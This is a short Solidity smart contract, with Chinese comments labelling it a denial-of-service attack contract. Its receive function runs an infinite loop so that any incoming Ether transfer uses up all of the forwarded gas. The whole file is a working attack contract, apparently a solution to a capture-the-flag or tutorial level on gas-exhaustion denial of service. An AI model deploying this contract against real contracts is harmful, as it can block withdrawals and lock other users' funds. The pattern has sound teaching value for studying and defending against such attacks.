// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 拒绝服务攻击合约
contract DenialHacker {

     receive()  external payable{

        // 持续执行，以致gas消耗殆尽
        while (true){
            
        }
    }
}